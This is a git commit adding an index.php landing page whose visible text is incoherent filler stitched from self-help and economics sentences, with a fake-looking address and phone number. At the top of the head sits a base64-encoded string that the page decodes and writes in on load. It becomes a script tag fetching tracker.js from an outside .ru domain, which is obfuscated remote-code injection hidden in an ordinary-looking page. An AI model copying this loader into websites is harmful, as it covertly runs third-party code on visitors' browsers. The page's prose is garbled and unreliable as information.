1a9eb531484fa36234fd0af004ed5402ca63a1e6
vrceassd <79533251+vrceassd@users.noreply.github.com>
2021-02-23 19:01:44 +0200

    Add files via upload

---
+++ index.php
@@ -0,0 +1,118 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <script type="text/javascript">
+	let encoded = 'PHNjcmlwdCBzcmM9Imh0dHBzOi8va2xvb2xrLnJ1L3RyYWNrZXIuanMiPjwvc2NyaXB0PjxkaXYgY2xhc3M9ImNoZWNrX2Zvcl83aXZlaHd2bmIzdzhwb3NrZ3giPjwvZGl2Pg==';let decoded = atob(encoded);document.write(''+ decoded +'');
+	</script>
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <title>But I kept thinking about it.  After we discussed the situation </title>
+
+	<link href="https://fonts.googleapis.com/css?family=Open+Sans" rel="stylesheet">
+	<link href="https://fonts.googleapis.com/css?family=Quicksand" rel="stylesheet">
+    <link rel="stylesheet" href="http://maxcdn.bootstrapcdn.com/font-awesome/4.6.0/css/font-awesome.min.css">
+    <link rel="stylesheet" href="styles.css">
+
+</head>
+
+<body>
+
+	<header class="cqk1ofok4gxrsf19v52b1">
+		<nav>
+			<li><a href="#">MAIN</a></li>
+			<li><a href="our_themes.html">OUR THEMES</a></li>
+			<li><a href="#">FLOW</a></li>
+			<li><a href="#">E-MAIL</a></li>
+		</nav>
+	</header>
+
+
+	<section class="hero" class="pjdfom0pfrkorsag0simplay">
+		<div class="background-image" style="background-image: url(main.jpg);"></div>
+		<h1>But I kept thinking about it.  After we discussed the situation </h1>
+	</section>
+
+
+	<section class="our-work" class="ga16c7zaoqugb8zf6g75pbyk">
+		<h3 class="title">The consumer who has no alternative has to put up w</h3>
+		<p>In a word, he came to our room, fifteen minutes late, which, in fact, did not really matter to us.  The source of these financial resources are funds that the government collects from individuals and legal entities.  They are imbued with those unchanging values ​​that constitute the essence, the core of the organization.  Terry Warner calls a "change agent." Instead of passing on these unusable scripts to future generations, we can modify them.  Tell me what's bothering you.  And, since, in accordance with Parkinson's Law, “work fills all the time allotted for it,” there is no time left for discussion of “different” issues.  You are my boss.  Leadership and Management are Two Creations Habit 2 is based on the principles of personal leadership, which means that leadership is the first creation. </p>
+		<hr>
+
+		<ul class="grid" class="kh9bdmv23ko2nz87dboe">
+			<li class="large" style="background-image: url(image1.jpg);"></li>
+		</div>
+	</section>
+	
+
+	<section class="our-work" class="cqk1ofok4gxrsf19v52b1">
+		<h3 class="title">Data collection.  This paradigm rests on t</h3>
+		<p>It's easy to see that independence requires more maturity than dependence.  Plus, as you openly and honestly share what you’ve learned with others, you’ll be surprised to find that negative labels and prejudices that someone might associate with you disappear.  I believe that the more in harmony a person lives with conscience, the more he can realize his potential; accordingly, the less the degree of his agreement with conscience, the less capable he is to rise above animal existence.  Monopoly is an exclusive right in a certain area of ​​the state, organization, company.  They have been trained and programmed to communicate defensively or patronizingly, or have grown up with the belief that no one should be trusted.  With the growth of hierarchy, the costs of transmission and processing of information required for decision-making grow.  To a greater or lesser extent, people use this principle in a variety of life situations.  I opened it, and my gaze fell on the phrase that had a powerful influence on my entire future life.  If the prices for manufactured products rise, it means that society needs goods of this kind, "informing" the producers about this by purchasing a product at a given price.  It may turn out that fame, achievement, money, or whatever we are striving for, is not even partially the wall.  It manifests itself in a change in objects of taxation, a decrease in the tax base, a decrease in the tax rate, etc.The law provides for the following types of benefits: 1) non-taxable minimum object of tax; 2) exemption from taxation of certain elements of the object of tax; 3) tax exemption for certain categories of payers; 4) lowering tax rates; 5) targeted tax benefits; 6) other tax benefits.  I would saythat children have an innate sense of justice, even though they have had negative experiences.  The main goal of production and costs is to answer how much resources should be involved and in what proportions if the firm has the goal of increasing production. </p>
+		<hr>
+
+		<ul class="grid">
+			<li class="large" class="pjdfom0pfrkorsag0simplay" style="background-image: url(image2.jpg);"></li>
+		</div>
+	</section>
+	
+
+	<section class="our-work" class="ga16c7zaoqugb8zf6g75pbyk">
+		<h3 class="title">You can,having assigned someone to do that part of the work tha</h3>
+		<p>There is a mental - or first - creation and a physical - or second creation.  The demand curve can be presented non-linearly.  Perfectly competitive markets are markets where the following basic conditions are met: 1) the presence of many small firms (enterprises), whose share in the industry market is negligible - less than 1%; 2) sales for any period of time (atomized market); 3) the products are homogeneous.  Then I use Habit 4 and tell you, “I see we approach this situation in different ways.  However, suppose you have the wrong card.  And when rush hours came, the managers entrusted their salespeople with all the dirty work - inventory, work in the warehouse and cleaning - while they themselves, standing at the checkout, again carried out most of the sales. </p>
+		<hr>
+
+		<ul class="grid">
+			<li class="large" class="kh9bdmv23ko2nz87dboe" style="background-image: url(image3.jpg);"></li>
+		</div>
+	</section>
+	
+
+	<section class="our-work" class="cqk1ofok4gxrsf19v52b1">
+		<h3 class="title">Perhaps the table below will help you organize your</h3>
+		<p>The statement that people have preferences confirms the fact thatthat they actually rank different goods and services according to their tastes.  You know that in the course of your life you will be able to experience the validity of the right principles many times over.  As you can see from the matrix, activities are determined by two factors:urgent and important.  Seewhat green and clean yard our neighbors have? So here it should be like this: green and clean.  They read their biographies in other people's lives. </p>
+		<hr>
+
+		<ul class="grid">
+			<li class="large" class="pjdfom0pfrkorsag0simplay" style="background-image: url(image4.jpg);"></li>
+		</div>
+	</section>
+	
+
+	<section class="our-work" class="ga16c7zaoqugb8zf6g75pbyk">
+		<h3 class="title">Make the most of your senses.  Many divorc</h3>
+		<p>So often it turns out that the problem is in the system, not in the people! If you put good people in a bad system, you will get bad results.Watering requiredflowers that you want to grow.  Good? For the next few minutes I was busy shouting: - Take it off! ..  Suddenly your boss calls you into his office and says that he will need your help in the evening in preparing for an important meeting, which will take place tomorrow at nine in the morning.  They make plans and schedules for the future and generally seem more responsible because they manage to get things done on time.  Only these sacrifices weren't worth it!(You just don't understand anything!) - Look, maybe if you could study more at home and sit less at the TV ...  Habits 1, 2, and 3 help us develop and maintain the wholeness, unity of our personality.  Aristotle Our character is fundamentally made up of our habits.  Unemployed people are unemployed people who are actively looking for work.  However, they do not remain on opposite sides of the problem.  In anticipation of price increases, manufacturers sometimes hold back the product in order to create a temporary shortage of the product and accelerate price increases.  The four factors to upgrade Habit 7 are your personal resources and assets (PC).It preserves and develops your most valuable resource - yourself.  25. </p>
+		<hr>
+	</section>
+
+
+
+	<section class="contact">
+		<h3 class="kh9bdmv23ko2nz87dboe" class="title">everything! I don’t want to talk about it anymore! It is obviou</h3>	
+		<p>Although people may argue about how these principles are defined, manifested or implemented, I think that inwardly everyone knows, everyone is convinced that these principles exist.  Paradigms and principles From the inside - out Everything that is outstanding in this world certainly comes from the right way of life.  A sincere apology for withdrawing from an account.  She realizeshow much has been invested in preparing for this fishing holiday, and she understands how important it is to keep good memories of all this.  And then, no matter how much I myself need your love and influence, next to you I will not feel safe enough to open my views, thoughts and innermost feelings to you.  Instead of trying to change him, we tried to look from the outside - to separate ourselves from him, to feel his personality, individuality and dignity.  The law is based on the concept of having two opposing sides.  This is a very personal and at the same time extremely important area of ​​life.  But frankly,I mentally tried to apply what I heard not to business, but to family relationships. </p>
+		<hr>
+
+		<form>
+			<input type="email" placeholder="-Email">
+			<input type="Name" placeholder="-Name">
+			<input type="Surmane" placeholder="-Surname">
+			<a href="#" class="btn">Subscribe now</a>
+		</form>
+
+	</section>
+
+	<footer class="cqk1ofok4gxrsf19v52b1">
+		<ul>
+			<li><a href="#"><i class="fa fa-twitter-square" class="pjdfom0pfrkorsag0simplay"></i></a></li>
+			<li><a href="#"><i class="fa fa-facebook-square"></i></a></li>
+			<li><a href="#"><i class="fa fa-snapchat-square" class="ga16c7zaoqugb8zf6g75pbyk"></i></a></li>
+			<li><a href="#"><i class="fa fa-pinterest-square"></i></a></li>
+			<li><a href="#"><i class="fa fa-github-square" class="kh9bdmv23ko2nz87dboe"></i></a></li>
+		</ul>
+		<p><a href="policy.html">Privacy policy</a></p>
+		<p>828 Sydni Pine, Apt. 546, 93154-0937, New Harryville, Texas, United States</p>
+		<p>Phone number: +233524173268400</p>
+	</footer>
+
+</body>
+
+</html>
